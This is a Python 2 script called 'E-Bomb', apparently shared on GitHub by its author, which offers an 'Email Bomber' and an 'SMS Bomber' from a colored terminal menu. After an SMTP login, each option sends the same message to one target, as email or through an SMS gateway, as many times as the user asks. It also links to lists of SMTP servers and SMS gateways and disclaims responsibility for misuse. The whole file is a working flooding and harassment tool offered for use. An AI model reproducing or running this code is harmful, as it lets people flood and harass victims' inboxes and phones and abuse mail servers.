#!/usr/bin/env python
# -*- coding: utf-8 -*-
import smtplib
import random, string
from time import sleep
from getpass import getpass
from subprocess import call
import sys, platform, subprocess, socket, time, os, urllib,  random, string, urllib2
import mimetypes
import sys
import time
from email.MIMEText import MIMEText
class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   WHITE = '\033[37m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   COREGREEN = '\033[1;35;32m'
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
CG = '\033[1;35;32m' # magenta



			####################################################
			#		Creator: @sprx.sh						   #
			#		Do not leech this code, learn from it.	   #
			#		Sources: google.com for MIME and Colors :) #
			####################################################
links = (color.WHITE + color.BOLD + '''
- SMTP Server List: https://pastebin.com/zfB0ENzy
- SMS Gateway List: https://pastebin.com/NqC18TXA
''')

banner = (color.CYAN + '''
	███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ 
	██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
	█████╗█████╗██████╔╝██║   ██║██╔████╔██║██████╔╝
	██╔══╝╚════╝██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
	███████╗    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
	╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
		By: @sprx.sh | <3
		''' + color.END)
os.system('clear')
print banner
print links

print (color.YELLOW + color.BOLD + "┌─────────────────────────────────────────────────────────────────┐")
print (color.YELLOW + color.BOLD + "│ " + color.RED + color.BOLD + "[1] " + color.WHITE + color.BOLD + "- Email Bomber") + (color.RED + color.BOLD + "                   [2] " + color.WHITE + color.BOLD + "- SMS Bomber" + color.YELLOW + color.BOLD + "           │ ")
print (color.YELLOW + color.BOLD + "│ " + color.RED + color.BOLD + "[3] " + color.WHITE + color.BOLD + "- Help")   + (color.RED + color.BOLD + "                           [4] " + color.WHITE + color.BOLD + "- Information" + color.YELLOW + color.BOLD + "          │ ")
print (color.YELLOW + color.BOLD + "└─────────────────────────────────────────────────────────────────┘")

bomberoption = raw_input(color.YELLOW + color.BOLD + " └─" + color.CYAN + color.BOLD + "[✗]─[user@ebomb]: ")
print('')
 
def emailbomboption():
            print (color.WHITE + color.BOLD + "[Connection/Login]" + color.BOLD + color.COREGREEN)
            time.sleep(2)
            smtpserver=raw_input("Server: ")
            smtpport=input("Port: ")
            try:
                  mailServer = smtplib.SMTP(smtpserver,smtpport)
            except IOError, e:
                  print 'Error: %s' %(e)
                  time.sleep(5)
                  sys.exit(1)
            mailServer.starttls()
            name=raw_input("Email/Username: ")
            password=getpass("Password(Invisible): ")
            try:
                  mailServer.login(name,password)
            except BaseException, e:
                  print 'Error: %s' % (e)
                  time.sleep(3) 
            print (color.WHITE + "" + color.BOLD + color.COREGREEN)
            print (color.WHITE + "[Writing the Email]" + color.BOLD + color.COREGREEN)
            print (color.RED + "Example: " + color.WHITE + color.UNDERLINE + "name@service.com" + color.END + color.COREGREEN)
            From = raw_input("From: ")
            Receiver = raw_input("To: ")
            Subject = raw_input("Subject: ")
            Message = raw_input("Message: ")
            email = MIMEText(Message)
            email['From']=From
            email['To']=Receiver
            email['Subject']=Subject
            amount = input(color.CYAN + "Amount: ")
            x = 0
            while x < amount:
                  mailServer.sendmail(From, Receiver, email.as_string())
                  x+=1
            print "Sent %d messages to %s" %(amount,Receiver)
            time.sleep(2)
            print "Email(s) Sent!\n"
            print "Instagram: @sprx.sh"
            
def smsbomboption():
            print (color.WHITE + color.BOLD + "[Connection/Login]" + color.BOLD + color.COREGREEN)
            time.sleep(2)
            smtpserver=raw_input("Server: ")
            smtpport=input("Port: ")
            try:
                  mailServer = smtplib.SMTP(smtpserver,smtpport)
            except IOError, e:
                  print 'Error: %s' %(e)
                  time.sleep(5)
                  sys.exit(1)
            mailServer.starttls()
            name=raw_input("Email: ")
            password=getpass("Password(Invisible): ")
            try:
                  mailServer.login(name,password)
            except BaseException, e:
                  print 'Error: %s' % (e)
                  time.sleep(3) 
            print (color.WHITE + "" + color.BOLD + color.COREGREEN)
            print (color.WHITE + "[Writing the SMS]" + color.BOLD + color.COREGREEN)
            print (color.RED + "Example: " + color.WHITE + color.UNDERLINE + "number@smsgateway.com" + color.END + color.COREGREEN)
            From = raw_input("From: ")
            Receiver = raw_input("To: ")
            Subject = raw_input("Subject: ")
            Message = raw_input("Message: ")
            email = MIMEText(Message)
            email['From']=From
            email['To']=Receiver
            email['Subject']=Subject
            amount = input(color.CYAN + "Amount: ")
            x = 0
            while x < amount:
                  mailServer.sendmail(From, Receiver, email.as_string())
                  x+=1
            print "Sent %d SMS Messages to %s" %(amount,Receiver)
            time.sleep(2)
            print "SMS(s) Sent!\n"
            print "Instagram: @sprx.sh"
            
def help():
		os.system('clear')
		print banner
		print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Usage] " + color.WHITE + color.BOLD + "- sudo python EBomb.py") + (color.YELLOW + color.BOLD + "                                  │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Cant Login] " + color.WHITE + color.BOLD + "- Did you type the email/password correct?") + (color.YELLOW + color.BOLD + "         │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Coding Errors] " + color.WHITE + color.BOLD + "- You or Someone else messed with the code :/") + (color.YELLOW + color.BOLD + "   │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Updater] " + color.WHITE + color.BOLD + "- https://github.com/sprxsh/emailbomber") + (color.YELLOW + color.BOLD + "               │ ")
		print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")

def information():
		os.system('clear')
		print banner
		print (color.YELLOW + color.BOLD + " ┌─────────────────────────────────────────────────────────────────┐")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Instagram] " + color.WHITE + color.BOLD + "- https://www.instagram.com/sprx.sh/") + (color.YELLOW + color.BOLD + "                │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Discord] " + color.WHITE + color.BOLD + "- SQLFail#6868") + (color.YELLOW + color.BOLD + "                                        │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Version] " + color.WHITE + color.BOLD + "- v2 - Design Changed :)") + (color.YELLOW + color.BOLD + "                              │ ")
		print (color.YELLOW + color.BOLD + " │ " + color.RED + color.BOLD + "[Protection] " + color.WHITE + color.BOLD + "- I (@SPRX.SH) AM NOT RESPONSIBLE FOR WHAT YOU DO") + (color.YELLOW + color.BOLD + "  │ ")
		print (color.YELLOW + color.BOLD + " └─────────────────────────────────────────────────────────────────┘")
		
#Bomber Options  
if bomberoption == '1':
  	  	emailbomboption() 
elif bomberoption == '2':
  		smsbomboption()
elif bomberoption == '3':
  		help()
elif bomberoption == '4':
  		information()
